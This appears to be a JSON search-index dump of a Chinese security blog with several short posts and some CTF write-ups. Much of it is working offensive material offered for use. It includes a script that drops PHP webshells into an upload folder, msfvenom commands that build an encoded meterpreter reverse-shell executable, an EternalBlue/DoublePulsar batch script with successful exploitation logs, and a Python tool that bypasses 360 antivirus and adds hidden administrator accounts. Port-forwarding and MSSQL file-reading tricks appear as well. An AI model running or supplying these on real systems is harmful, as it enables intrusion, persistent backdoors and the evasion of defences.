&apos;sans-serif&apos;,sans-serif; text-decoration: none; &#125;td, div &#123; max-width: 1024px; &#125;input, select, textarea &#123; border: 0; padding: 0; &#125;input, select, textarea &#123; -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box; -ms-box-sizing: border-box; &#125;input::-moz-focus-inner &#123; border: 0;padding: 0; &#125;body &#123; background-color: #717678; font-family: &apos;sans-serif&apos;,sans-serif !important; font-size: 10px !important; color: #525252;&#125;*:focus &#123;outline: none;&#125;.but1, .but2, .but3, .actbut, .but1:active, .but2:active, .but3:active .actbut:active &#123; border: 1px solid #cccccc; margin-left: 1px; text-shadow: 1px 1px 2px #ffffff; vertical-align: middle; &#125;.but1, .but2, .but3, .actbut &#123; background: #F5F5F5;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=&apos;#F5F5F5&apos;, endColorstr=&apos;#E0E0E0&apos;);background: -webkit-gradient(linear, left top, left bottom, from(#F5F5F5), to(#E0E0E0));background: -moz-linear-gradient(top, #F5F5F5, #E0E0E0);background: -o-linear-gradient(top, #F5F5F5, #E0E0E0); &#125;.but1:hover, .but2:hover, .but3:hover, .actbut:hover &#123; background: #E0E0E0;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=&apos;#E0E0E0&apos;, endColorstr=&apos;#F5F5F5&apos;);background: -webkit-gradient(linear, left top, left bottom, from(#E0E0E0), to(#F5F5F5));background: -moz-linear-gradient(top, #E0E0E0, #F5F5F5);background: -o-linear-gradient(top, #E0E0E0, #F5F5F5); cursor: pointer; &#125;.but1 &#123; width: 28px; height: 18px; font-size: 10px; font-weight: bold; &#125;.but2 &#123; color: #4F4F4F; padding: 0 10px 0 10px; height: 20px; font-size: 10px; &#125;.actbut &#123; color: #4F4F4F; padding: 0 10px 0 10px; height: 18px; font-size: 10px; font-weight: normal; &#125;.login &#123; background: #F2F2F2; border: 1px solid #777777 ; -moz-box-shadow: #666666 0 0 8px; -webkit-box-shadow: 0 0 8px #666666; box-shadow: 0 0 8px #666666; margin-top: 150px; padding: 10px; text-align: left; &#125;.login td &#123; padding: 0; &#125;.login input &#123; background-color: #FFFFFF; border: 1px solid #CCCCCC; color: #333333; margin: 1px; margin-right: 0; height:20px; width:150px; font-size: 10px; text-shadow: 1px 1px 5px #dddddd; vertical-align: middle; &#125;.lerror &#123; color: #FF0000; padding-bottom: 10px !important; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; align=&quot;center&quot; class=&quot;login&quot;&gt;&lt;tr valign=&quot;middle&quot;&gt;&lt;td&gt;&lt;form method=&quot;POST&quot; action=&quot;&quot;&gt;&lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; align=&quot;center&quot;&gt;&lt;tr valign=&quot;middle&quot;&gt;&lt;td&gt;&lt;span style=&quot;font-size: 9px; color: #333333; font-weight: bold;&quot;&gt;USER&amp;nbsp; &lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;zu&quot; value=&quot;&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr valign=&quot;middle&quot;&gt;&lt;td&gt;&lt;span style=&quot;font-size: 9px; color: #333333; font-weight: bold;&quot;&gt;PASS&amp;nbsp; &lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;zp&quot; value=&quot;&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr valign=&quot;middle&quot;&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;submit&quot; value=&quot;Connect&quot; class=&quot;but2&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;&apos;&apos;&apos;print(&apos;[*] 搅屎开始!&apos;)while True: dirlist = os.listdir(&apos;upload/&apos;) if &apos;phpspy.php&apos; in dirlist: print(&apos;[*] 搅屎完毕!&apos;) sys.exit() if len(dirlist)&gt;=20: with open(&apos;upload/&apos;+str(int(time.time()))+&apos;.php&apos;,&apos;w+&apos;) as f: f.write(str0) print(&apos;[+] 搅屎x1&apos;) if len(dirlist)&gt;=30: with open(&apos;upload/bypass.php&apos;,&apos;w+&apos;) as f: f.write(str1) print(&apos;[+] 搅屎x2&apos;) if len(dirlist)&gt;=40: with open(&apos;upload/phpspy.php&apos;,&apos;w+&apos;) as f: f.write(str2) print(&apos;[+] 搅屎x3&apos;) print(&apos;[-] 等待下一波搅屎&apos;) time.sleep(60)","categories":[{"name":"ctf","slug":"ctf","permalink":"https://exp10it.cn/categories/ctf/"}],"tags":[{"name":"php","slug":"php","permalink":"https://exp10it.cn/tags/php/"},{"name":"writeup","slug":"writeup","permalink":"https://exp10it.cn/tags/writeup/"}]},{"title":"msfvenom multiple encode","slug":"msfvenom-multi-encode","date":"2018-06-19T16:00:00.000Z","updated":"2018-08-02T03:05:06.157Z","comments":true,"path":"2018/06/20/msfvenom-multi-encode/","link":"","permalink":"https://exp10it.cn/2018/06/20/msfvenom-multi-encode/","excerpt":"除第一次需要指定 payload 外, 其他都用 -p - 代替, 多重编码需要指定 --platform 和 -a 并用 -f raw 输出, 最后一次编码更改为 -f exe. 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f raw | msfvenom -p - -e x86/jmp_call_additive -i 2 -a x86 --platform windows -f raw | msfvenom -p - e x86/alpha_upper -i 1 -a x86 --platform windows -f exe &gt; msf.exe","text":"除第一次需要指定 payload 外, 其他都用 -p - 代替, 多重编码需要指定 --platform 和 -a 并用 -f raw 输出, 最后一次编码更改为 -f exe. 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f raw | msfvenom -p - -e x86/jmp_call_additive -i 2 -a x86 --platform windows -f raw | msfvenom -p - e x86/alpha_upper -i 1 -a x86 --platform windows -f exe &gt; msf.exe Python3 实现 12345678args = &apos;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 &apos;encoders = &#123;&apos;x86/shikata_ga_nai&apos;: &apos;5&apos;, &apos;x86/jmp_call_additive&apos;: &apos;2&apos;, &apos;x86/alpha_upper&apos;: &apos;1&apos;&#125;for c in list(encoders.keys())[:-1]: encs += &apos;-e &apos; + c + &apos; -i &apos; + encoders.get(c) + &apos; -a x86 --platform windows -f raw | msfvenom -p - &apos;encs += &apos;-e &apos; + list(encoders.keys())[-1] + &apos; -i &apos; + encoders.get(list(encoders.keys())[-1]) + &apos; -a x86 --platform windows &apos;args += encs + &apos;-f exe &gt; msf.exe&apos;","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"python","slug":"python","permalink":"https://exp10it.cn/tags/python/"},{"name":"metasploit","slug":"metasploit","permalink":"https://exp10it.cn/tags/metasploit/"}]},{"title":"简单的渗透测试报告","slug":"pentest-report","date":"2018-06-17T16:00:00.000Z","updated":"2018-08-02T03:05:03.437Z","comments":true,"path":"2018/06/18/pentest-report/","link":"","permalink":"https://exp10it.cn/2018/06/18/pentest-report/","excerpt":"","text":"这份渗透测试报告是之前帮一个朋友写的, 敏感信息已经被我抠出来了, 只有框架. 12345678910111213141516171819201 项目概述 1.1 渗透测试目的 1.2 渗透测试范围 1.3 渗透测试工具 1.4 渗透测试组织 1.5 渗透测试原则2 渗透测试方法 2.1 工具自动分析 2.2 人工手动分析 2.3 风险评估3 网站漏洞详情４ 总结 ４.1 网站目前安全现状 ４.2 存在问题和整改建议 渗透测试报告.docx","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"security","slug":"security","permalink":"https://exp10it.cn/tags/security/"}]},{"title":"DREAD 风险评估","slug":"microsoft-dread-model","date":"2018-06-14T16:00:00.000Z","updated":"2018-08-02T03:04:59.725Z","comments":true,"path":"2018/06/15/microsoft-dread-model/","link":"","permalink":"https://exp10it.cn/2018/06/15/microsoft-dread-model/","excerpt":"微软的 DREAD 模型. 高危: 12-15分, 中危: 8-11分, 低危: 0-7分. 等级 高(3) 中(2) 低(1) Damage Potential 获取完全验证权限; 执行管理员操作; 非法上传文件 泄露敏感信息 泄露其他信息 Reproducibility 攻击者可以随意再次攻击 攻击者可以重复攻击, 但有时间限制 攻击者很难重复攻击 Exploitability 初学者在短期内能掌握攻击方法 熟练的攻击者才能完成这次攻击 漏洞利用条件非常苛刻 Affected users 所有用户, 默认配置, 关键用户 部分用户, 非默认配置 极少数用户, 匿名用户 Discoverability 漏洞很明显, 攻击条件很容易获得 在私有区域, 部分人能看到, 需要深入挖掘漏洞 发现该漏洞极其困难","text":"微软的 DREAD 模型. 高危: 12-15分, 中危: 8-11分, 低危: 0-7分. 等级 高(3) 中(2) 低(1) Damage Potential 获取完全验证权限; 执行管理员操作; 非法上传文件 泄露敏感信息 泄露其他信息 Reproducibility 攻击者可以随意再次攻击 攻击者可以重复攻击, 但有时间限制 攻击者很难重复攻击 Exploitability 初学者在短期内能掌握攻击方法 熟练的攻击者才能完成这次攻击 漏洞利用条件非常苛刻 Affected users 所有用户, 默认配置, 关键用户 部分用户, 非默认配置 极少数用户, 匿名用户 Discoverability 漏洞很明显, 攻击条件很容易获得 在私有区域, 部分人能看到, 需要深入挖掘漏洞 发现该漏洞极其困难 举个例子 1234567SQL 注入: D(3) + R(3) + E(3) + A(3) + D(3) = 15 高危XSS 攻击: D(2) + R(2) + E(2) + A(2) + D(2) = 10 中危钓鱼欺骗: D(3) + R(1) + E(2) + A(1) + D(1) = 8 中危铁锤砸机: D(1) + R(1) + E(1) + A(1) + D(1) = 5 低危","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"security","slug":"security","permalink":"https://exp10it.cn/tags/security/"}]},{"title":"sqlmap udf dll decode","slug":"sqlmap-udf-dll-decode","date":"2018-06-06T16:00:00.000Z","updated":"2018-08-02T03:04:57.177Z","comments":true,"path":"2018/06/07/sqlmap-udf-dll-decode/","link":"","permalink":"https://exp10it.cn/2018/06/07/sqlmap-udf-dll-decode/","excerpt":"","text":"udf/mysql/windows/32/lib_mysqludf_sys.dll_ 用 extra/cloak 下的 cloak.py 解码 cloak.py -d -i lib_mysqludf_sys.dll_ mysql 导入执行 select sys_eval(&#39;whoami&#39;);","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"sqlmap","slug":"sqlmap","permalink":"https://exp10it.cn/tags/sqlmap/"}]},{"title":"ms17-010 attack bat","slug":"ms17-010-attack-bat","date":"2018-06-02T16:00:00.000Z","updated":"2018-08-02T03:04:52.893Z","comments":true,"path":"2018/06/03/ms17-010-attack-bat/","link":"","permalink":"https://exp10it.cn/2018/06/03/ms17-010-attack-bat/","excerpt":"提取了 NSA 工具包里的 Eternalblue 和 Doublepulsar. Target 分为 XP 和 WIN72K8R2. 第一次打的时候会蓝屏, 大约 10 秒后服务器重启, 打到第二次就成功了. 生成 dll msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f dll &gt; bakdoor.dll payload 设置为 windows/x64/shell_bind_tcp 可以通过 netcat 连接, 也能用 windows/exec 直接添加账户.","text":"提取了 NSA 工具包里的 Eternalblue 和 Doublepulsar. Target 分为 XP 和 WIN72K8R2. 第一次打的时候会蓝屏, 大约 10 秒后服务器重启, 打到第二次就成功了. 生成 dll msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f dll &gt; bakdoor.dll payload 设置为 windows/x64/shell_bind_tcp 可以通过 netcat 连接, 也能用 windows/exec 直接添加账户. attack.bat 12345@echo offecho Usage: attack.bat 192.168.1.1 XP/WIN72K8R2 x86/x64 backdoor.dllecho.Eternalblue-2.2.0.exe --TargetIp %1 --Target %2 --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig log1.txtDoublepulsar-1.3.1.exe --NetworkTimeout 60 --OutConfig log2.txt --TargetIp %1 --TargetPort 445 --DllPayload %4 --DllOrdinal 1 ProcessName lsass.exe --ProcessCommandLine --Protocol SMB --Architecture %3 --Function Rundll 利用成功信息 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&gt; attack.bat 172.21.117.91 WIN72K8R2 x64 backdoor.dllUsage: attack.bat 192.168.1.1 XP/WIN72K8R2 x86/x64 backdoor.dll[*] Connecting to target for exploitation. [+] Connection established for exploitation.[*] Pinging backdoor... [+] Backdoor not installed, game on.[*] Target OS selected valid for OS indicated by SMB reply[*] CORE raw buffer dump (54 bytes):0x00000000 57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32 Windows Server 20x00000010 30 30 38 20 52 32 20 45 6e 74 65 72 70 72 69 73 008 R2 Enterpris0x00000020 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20 50 e 7601 Service P0x00000030 61 63 6b 20 31 00 ack 1.[*] Building exploit buffer[*] Sending all but last fragment of exploit packet ................DONE.[*] Sending SMB Echo request[*] Good reply from SMB Echo request[*] Starting non-paged pool grooming [+] Sending SMBv2 buffers .............DONE. [+] Sending large SMBv1 buffer..DONE. [+] Sending final SMBv2 buffers......DONE. [+] Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.[*] Sending SMB Echo request[*] Good reply from SMB Echo request[*] Sending last fragment of exploit packet! DONE.[*] Receiving response from exploit packet [+] ETERNALBLUE overwrite completed successfully (0xC000000D)![*] Sending egg to corrupted connection.[*] Triggering free of corrupted buffer.[*] Pinging backdoor... [+] Backdoor returned code: 10 - Success! [+] Ping returned Target architecture: x64 (64-bit) [+] Backdoor installed=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[*] CORE sent serialized output blob (2 bytes):0x00000000 08 00 ..[*] Received output parameters from CORE[+] CORE terminated with status code 0x00000000[+] Selected Protocol SMB[.] Connecting to target...[+] Connected to target, pinging backdoor... [+] Backdoor returned code: 10 - Success! [+] Ping returned Target architecture: x64 (64-bit) - XOR Key: 0x31705F65 SMB Connection string is: Windows Server 2008 R2 Enterprise 7601 Service Pack 1 Target OS is: 2008 R2 x64 Target SP is: 1 [+] Backdoor installed [+] DLL built [.] Sending shellcode to inject DLL [+] Backdoor returned code: 10 - Success! [+] Backdoor returned code: 10 - Success! [+] Backdoor returned code: 10 - Success! [+] Command completed successfully ms17-010.zip","categories":[{"name":"tools","slug":"tools","permalink":"https://exp10it.cn/categories/tools/"}],"tags":[{"name":"metasploit","slug":"metasploit","permalink":"https://exp10it.cn/tags/metasploit/"},{"name":"ms17-010","slug":"ms17-010","permalink":"https://exp10it.cn/tags/ms17-010/"}]},{"title":"net user bypass 360","slug":"net-user-bypass-360","date":"2018-06-01T16:00:00.000Z","updated":"2018-08-02T03:04:49.173Z","comments":true,"path":"2018/06/02/net-user-bypass-360/","link":"","permalink":"https://exp10it.cn/2018/06/02/net-user-bypass-360/","excerpt":"Lz1y Blog 参考 Lz1y 大佬的代码, 自己改了改. 完美过 360 用 Pyinstaller 打包: pyinstaller xxoo.py -F 大约 4mb 左右.","text":"Lz1y Blog 参考 Lz1y 大佬的代码, 自己改了改. 完美过 360 用 Pyinstaller 打包: pyinstaller xxoo.py -F 大约 4mb 左右. 12345678910111213141516171819202122232425262728293031323334353637import win32apiimport win32netimport win32netconimport sysdef AddUser(username,password): usr = &#123;&#125; usr[&apos;name&apos;] = username usr[&apos;password&apos;] = password usr[&apos;priv&apos;] = win32netcon.USER_PRIV_USER usr[&apos;comment&apos;] = None usr[&apos;flags&apos;] = win32netcon.UF_NORMAL_ACCOUNT | win32netcon.UF_SCRIPT try: win32net.NetUserAdd(None,1,usr) win32net.NetLocalGroupAddMembers(None,&apos;Administrators&apos;,3,[&#123;&apos;domainandname&apos;:username&#125;]) mem,tot,res = win32net.NetLocalGroupGetMembers(None,&apos;Administrators&apos;,3) print &apos;Successful&apos; except: print &apos;Failed&apos;def AddGuest(password): try: win32net.NetUserChangePassword(None,&apos;Guest&apos;,password,password) win32net.NetLocalGroupAddMembers(None,&apos;Administrators&apos;,3,[&#123;&apos;domainandname&apos;:&apos;Guest&apos;&#125;]) mem,tot,res = win32net.NetLocalGroupGetMembers(None,&apos;Administrators&apos;,3) print &apos;Successful&apos; except: print &apos;Failed&apos;if len(sys.argv) == 2: AddGuest(sys.argv[1])elif len(sys.argv) == 3: AddUser(sys.argv[1],sys.argv[2])else: print &apos;Usage:&apos; print &apos;xxoo.exe admin 123456&apos; print &apos;xxoo.exe 123456&apos;","categories":[{"name":"bypass","slug":"bypass","permalink":"https://exp10it.cn/categories/bypass/"}],"tags":[{"name":"360","slug":"360","permalink":"https://exp10it.cn/tags/360/"},{"name":"bypass","slug":"bypass","permalink":"https://exp10it.cn/tags/bypass/"}]},{"title":"lcx 转发工具","slug":"lcx-network-tran","date":"2018-05-31T16:00:00.000Z","updated":"2018-08-02T03:04:44.621Z","comments":true,"path":"2018/06/01/lcx-network-tran/","link":"","permalink":"https://exp10it.cn/2018/06/01/lcx-network-tran/","excerpt":"目前我手中的 lcx 有这几种. 123lcx - 初始版本mylcx - 重写版本lcxg - Golang 版本","text":"目前我手中的 lcx 有这几种. 123lcx - 初始版本mylcx - 重写版本lcxg - Golang 版本 lcxA to B 12A: lcx -listen 5000 1234B: lcx -slave IP 5000 127.0.0.1 3389 Connect 1234 (3389) mylcxA to B 12A: mylcx -listen 5000 1234B: mylcx -slave 3389 IP 5000 Connect 1234 (3389) lcxgA to B 12B: lcxg IP 5000A: lcxg 1234 127.0.0.1 3389 Connect 1234 (3389)","categories":[{"name":"noe","slug":"noe","permalink":"https://exp10it.cn/categories/noe/"}],"tags":[{"name":"tran","slug":"tran","permalink":"https://exp10it.cn/tags/tran/"}]},{"title":"mssql 读取文件","slug":"mssql-load-file","date":"2018-05-30T16:00:00.000Z","updated":"2018-08-02T03:04:38.877Z","comments":true,"path":"2018/05/31/mssql-load-file/","link":"","permalink":"https://exp10it.cn/2018/05/31/mssql-load-file/","excerpt":"","text":"注意反斜杠转义 需要 SA 或 BULK INSERT 权限 12345678910111213create table test( context ntext);BULK INSERT test FROM &apos;c:/pass.txt&apos;WITH ( DATAFILETYPE = &apos;char&apos;, KEEPNULLS);select * from test;drop table test;","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/tags/note/"},{"name":"mssql","slug":"mssql","permalink":"https://exp10it.cn/tags/mssql/"}]},{"title":"ISCC 2018 Msic WriteUp","slug":"iscc-2018-misc-writeup","date":"2018-05-19T16:00:00.000Z","updated":"2018-08-02T03:04:36.525Z","comments":true,"path":"2018/05/20/iscc-2018-misc-writeup/","link":"","permalink":"https://exp10it.cn/2018/05/20/iscc-2018-misc-writeup/","excerpt":"你们 520 在撩妹 而我却在做题 What is that?","text":"你们 520 在撩妹 而我却在做题 What is that? png 格式 应该是手指下面有 flag 拖进 tweakpng CRC 报错 可能更改了图片宽度 or 高度 winhex 修改 查看 数字密文69742773206561737921 hex 编码 解码即可 it&#39;s easy! 秘密电报ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA 培根密码 ilikeiscc 提交注意大写 重重谍影1Vm0wd2QyVkZOVWRXV0doVlYwZG9WVll3WkRSV2JGbDNXa1JTVjAxWGVGWlZNakExVjBaS2RHVkljRnBXVm5CUVZqQmtTMUl4VG5OaFJtUlhaV3RHTkZkWGRHdFRNVXB6V2toV2FsSnNjRmhhVjNoaFYxWmFjMWt6YUZSTlZtdzBWVEo0YzJGR1NuTlhiR2hYWVd0d2RsUnRlR3RqYkdSMFVteFdUbFp0ZHpCV2EyTXhVekZSZUZkc1ZsZGhlbXhoVm01d1IyTldjRVZTYlVacVZtdHdlbGRyVlRWVk1ERldZMFZ3VjJKR2NIWlpWRXBIVWpGT1dXSkhhRlJTVlhCWFZtMDFkMUl3TlhOVmJGcFlZbGhTV1ZWcVFURlRWbEY0VjIxR2FGWnNjSGxaYWs1clZqSkdjbUo2UWxwV1JWcDZWbXBHVDJNeGNFaGpSazVZVWxWd1dWWnRNVEJXTVUxNFdrVmtWbUpHV2xSWlZFNVRWVVpzYzFadVpGUmlSbHBaVkZaU1ExWlhSalpTYTJSWFlsaENVRll3V21Gak1XUnpZVWRHVTFKV2NGRldha0poV1ZkU1YxWnVTbEJXYldoVVZGUktiMDB4V25OYVJFSm9UVlpXTlZaSE5VOVdiVXB5WTBaYVdtRXhjRE5aTW5oVFZqRmFkRkpzWkU1V2JGa3dWbXhrTUdFeVJraFRiRnBYWVd4d1dGWnFUbE5YUmxsNVRWVmFiRkp0VW5wWlZWcFhZVlpLZFZGdWJGZGlXRUpJV1ZSS1QxWXhTblZWYlhoVFlYcFdWVmRYZUZOamF6RkhWMjVTYWxKWVVrOVZiVEUwVjBaYVNFNVZPVmRXYlZKS1ZWZDRhMWRzV2taWGEzaFhUVlp3V0ZwR1pFOVRSVFZZWlVkc1UyRXpRbHBXYWtvd1lURkplRmR1U2s1V1ZscHdWVzB4VTFac1duUk5WazVPVFZkU1dGZHJWbXRoYXpGeVRsVndWbFl6YUZoV2FrWmhZekpPUjJKR1pGTmxhMVYzVjJ0U1IyRXhUa2RWYmtwb1VtdEtXRmxzWkc5a2JHUllaRVprYTJKV1ducFhhMXB2Vkd4T1NHRklRbFZXTTJoTVZqQmFZVk5GTlZaa1JscFRZbFpLU0ZaSGVGWmxSbHBYVjJ0YVQxWldTbFpaYTFwM1dWWndWMXBHWkZSU2EzQXdXVEJWTVZZeVNuSlRWRUpYWWtad2NsUnJXbHBsUmxweVdrWm9hVkpzY0ZsWFYzUnJWVEZaZUZkdVVtcGxhMHB5VkZaYVMxZEdXbk5oUnpsWVVteHNNMWxyVWxkWlZscFhWbGhvVjFaRldtaFdha3BQVWxaU2MxcEhhRTVpUlc4eVZtdGFWMkV4VVhoYVJXUlVZa2Q0Y1ZWdGRIZGpSbHB4VkcwNVZsWnRVbGhXVjNSclYyeGFjMk5GYUZkaVIyaHlWbTB4UzFaV1duSlBWbkJwVW14d2IxZHNWbUZoTWs1elZtNUtWV0pHV2s5V2JHaERVMVphY1ZKdE9XcE5WbkJaVld4b2IxWXlSbk5UYldoV1lURmFhRlJVUm1GamJIQkhWR3hTVjJFelFqVldSM2hoWVRGU2RGTnJXbXBTVjFKWVZGWmFTMUpHYkhGU2JrNVlVbXR3ZVZkcldtdGhWa2w1WVVjNVYxWkZTbWhhUkVaaFZqRldjMWRzWkZoU01taFFWa1phWVdReFNuTldXR3hyVWpOU2IxVnRkSGRXYkZwMFpVaE9XbFpyY0ZsV1YzQlBWbTFXY2xkdGFGWmlXRTE0Vm0xNGExWkdXbGxqUms1U1ZURldObFZyVGxabGJFcENTbFJPUlVwVVRrVSUzRA== base64 一直解 注意 url 编码 123U2FsdGVkX183BPnBd50ynIRM3o8YLmwHaoi8b8QvfVdFHCEwG9iwp4hJHznrl7d4B5rKClEyYVtx6uZFIKtCXo71fR9Mcf6b0EzejhZ4pnhnJOl+zrZVlV0T9NUA+u1ziN+jkpb6ERH86j7t45v4Mpe+j1gCpvaQgoKC0Oaa5kc= AES key 为空 缽娑遠呐者若奢顛悉呐集梵提梵蒙夢怯倒耶哆般究有栗 tudoucode 解密 把我复制走 有趣的 ISCC winhex 末尾 1&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#54;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#99;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#49;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#55;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#98;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#57;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#51;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#51;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#51;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#50;&amp;#48;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#57;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#51;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#50;&amp;#48;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#54;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#53;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#101;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#100; unicode 解码 1\\u0066\\u006c\\u0061\\u0067\\u007b\\u0069\\u0073\\u0063\\u0063\\u0020\\u0069\\u0073\\u0020\\u0066\\u0075\\u006e\\u007d 再解一次 flag{iscc is fun} Where is the FLAG? 拖进 tweakpng 看到 Adobe Photoshop 打开后拼接图层 扫描即可得到 flag 凯撒十三世ebdgc697g95w3 13 次移位 roqtp697t95j3 提交发现不对 后来想想 flag 开头应该是 flag{} 之类的 r -&gt; f o -&gt; l q -&gt; a t -&gt; g 以此类推 flag:yougotme 一只猫的心思 foremost 分离出 doc 1名西三陵帝焰数诵诸山众參哈瑟倒陰捨劫奉惜逝定雙月奉倒放足即闍重号貧老诵夷經友利普过孕北至花令藐灯害蒙能羅福羅夢开雙禮琉德护慈積寫阿璃度戏便通故西故敬于瑟行雙知宇信在礙哈数及息闍殺陵游盧槃药諦慈灯究幽灯豆急彌貧豆親诵梭量树琉敬精者楞来西陰根五消夢众羅持造彌六师彌怖精僧璃夫薩竟祖方夢訶橋經文路困如牟憐急尼念忧戏輸教乾楞能敬告树来楞殊倒哈在紛除亿茶涅根輸持麼阿空瑟稳住濟号他方牟月息盡即来通貧竟怖如槃精老盡恤及游薩戏师毒兄宝下行普鄉释下告劫惜进施盡豆告心蒙紛信胜东蒙求帝金量礙故弟帝普劫夜利除積众老陀告沙師尊尼捨惜三依老蒙守精于排族祖在师利寫首念凉梭妙經栗穆愛憐孝粟尊醯造解住時刚槃宗解牟息在量下恐教众智焰便醯除寂想虚中顛老弥诸持山諦月真羅陵普槃下遠涅能开息灯和楞族根羅宝戒药印困求及想月涅能进至贤金難殊毘瑟六毘捨薩槃族施帝遠念众胜夜夢各万息尊薩山哈多皂诵盡药北及雙栗师幽持牟尼隸姪遠住孕寂以舍精花羅界去住勒排困多閦呼皂難于焰以栗婦愛闍多安逝告槃藐矜竟孕彌弟多者精师寡寫故璃舍各亦方特路茶豆積梭求号栗怖夷凉在顛豆胜住虚解鄉姪利琉三槃以舍劫鄉陀室普焰于鄉依朋故能劫通 拿之前的网址解密hex 1R1VaREdNSlVHVTNVQ05KU0dRMlRNTkJVSVUyVEdOU0RHWTJESU9CVkdJMlRNTlpRR1UyVEtOSlRHQVpUS05DREdVWkRHTUJXR1EyVUNOQ0ZHUTNES01SVkdBMlRJTkpXRzRZREtOWlZHTTJUTU5TQ0c0NFRLTVJVR1kyRUtOQ0ZHVTNUTVFaVklFMkRRTkpYR1UzRE9NQlZHVTJUSU5KVkdNWVRNTUpWR1kzRUVOU0RHVkFUSVJCV0lNMlRNTkJVR1UyRE1RUlVJVTJEUU5KU0dNWVRPTUJVR00yVE1OQlZHWTJES01CVkdFM0VHTktCR1JBVEtOWlZHUTJFQ05CVkdVMkRHTUJUR0UzRENOSldHUTJUTU5CVkdZMkVJTlNDR1VaRElRWlZHUTJUS05DQkdVMlRLTVJUR0EyRE1OUlJHVTNESU5KVUlVMkVNTkpSR01ZREtRSlVIQTJUTU5KVUdSQVRJTVJWR0EyVElNWlFHTTRUS01CVkdFWlVJTTJF base64 1GUZDGMJUGU3UCNJSGQ2TMNBUIU2TGNSDGY2DIOBVGI2TMNZQGU2TKNJTGAZTKNCDGUZDGMBWGQ2UCNCFGQ3DKMRVGA2TINJWG4YDKNZVGM2TMNSCG44TKMRUGY2EKNCFGU3TMQZVIE2DQNJXGU3DOMBVGU2TINJVGMYTMMJVGY3EENSDGVATIRBWIM2TMNBUGU2DMQRUIU2DQNJSGMYTOMBUGM2TMNBVGY2DKMBVGE3EGNKBGRATKNZVGQ2ECNBVGU2DGMBTGE3DCNJWGQ2TMNBVGY2EINSCGUZDIQZVGQ2TKNCBGU2TKMRTGA2DMNRRGU3DINJUIU2EMNJRGMYDKQJUHA2TMNJUGRATIMRVGA2TIMZQGM4TKMBVGEZUIM2E base32 15231457A5245644E536C6448525670555530354C5230645A4E4652505456705753566B7952464E4E576C5A485756705554553161566B6C5A4D6C5644546B4E485231704356456450516C5A4A57544A4554303161564564564D6B524C54554A555230466156454E4F51305A4856544A425054303950513D3D hex 1R1EzREdNSldHRVpUU05LR0dZNFRPTVpWSVkyRFNNWlZHWVpUTU1aVklZMlVDTkNHR1pCVEdPQlZJWTJET01aVEdVMkRLTUJUR0FaVENOQ0ZHVTJBPT09PQ== base64 